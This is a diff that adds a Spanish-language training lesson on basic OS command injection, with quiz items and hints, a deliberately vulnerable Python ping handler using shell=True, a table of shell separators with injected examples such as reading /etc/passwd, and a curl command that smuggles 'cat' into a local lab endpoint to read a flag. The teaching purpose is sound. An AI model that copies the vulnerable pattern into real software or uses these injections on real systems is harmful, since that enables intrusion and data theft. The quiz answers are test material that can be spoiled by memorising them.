@@ -1,0 +1,60 @@
+---
+index: 1
+title: "Detectar y explotar command injection básica"
+questions:
+  - id: command-injection-t01-q01
+    prompt: "¿Qué carácter permite encadenar un segundo comando tras el primero en shell?"
+    hint: "El punto y coma."
+    kind: text
+  - id: command-injection-t01-q02
+    prompt: "En el lab, envía la flag que está en /tmp/flags/flag1.txt (endpoint /ping con inyección básica)."
+    hint: "curl 'http://127.0.0.1:18084/ping?host=8.8.8.8;cat /tmp/flags/flag1.txt'"
+    kind: flag
+  - id: command-injection-t01-q03
+    prompt: "¿Qué hace el operador && en un comando shell?"
+    hint: "Ejecuta el segundo SOLO si el primero tuvo éxito."
+    kind: choice
+    options:
+      - id: a
+        label: "Ejecuta ambos siempre"
+      - id: b
+        label: "Ejecuta el segundo comando solo si el primero terminó con éxito (exit 0)"
+      - id: c
+        label: "Ejecuta solo el primero"
+      - id: d
+        label: "Es un comentario"
+---
+
+## El ping que no debería existir
+
+El lab tiene una utilidad de "ping" que pasa tu input DIRECTO a la shell:
+
+```python
+# Código VULNERABLE del lab:
+result = subprocess.run(f'ping -c 1 -W 2 {host}', shell=True)
+```
+
+Uso normal: `/ping?host=8.8.8.8` → hace ping a 8.8.8.8.
+
+Inyección: `/ping?host=8.8.8.8;cat /tmp/flags/flag1.txt` → hace ping Y lee el archivo.
+
+## Los separadores de comandos
+
+| Separador | Comportamiento | Ejemplo |
+|---|---|---|
+| `;` | Ejecuta ambos (siempre) | `ping x; cat /flag` |
+| `&&` | Segundo solo si primero OK | `ping x && cat /flag` |
+| `\|\|` | Segundo solo si primero FALLA | `ping x \|\| cat /flag` |
+| `\|` | Pipe: salida del primero → entrada del segundo | `cat /etc/passwd \| grep root` |
+| `` ` `` | Command substitution | `` ping `whoami` `` |
+| `$()` | Command substitution | `ping $(whoami)` |
+| `\n` | Nueva línea = nuevo comando | `ping x\ncat /flag` |
+
+## Extrae la primera flag
+
+```bash
+# En el lab (levántalo desde el panel Laboratorio):
+curl "http://127.0.0.1:18084/ping?host=8.8.8.8;cat%20/tmp/flags/flag1.txt"
+```
+
+La respuesta contiene el output del ping Y el contenido del archivo.
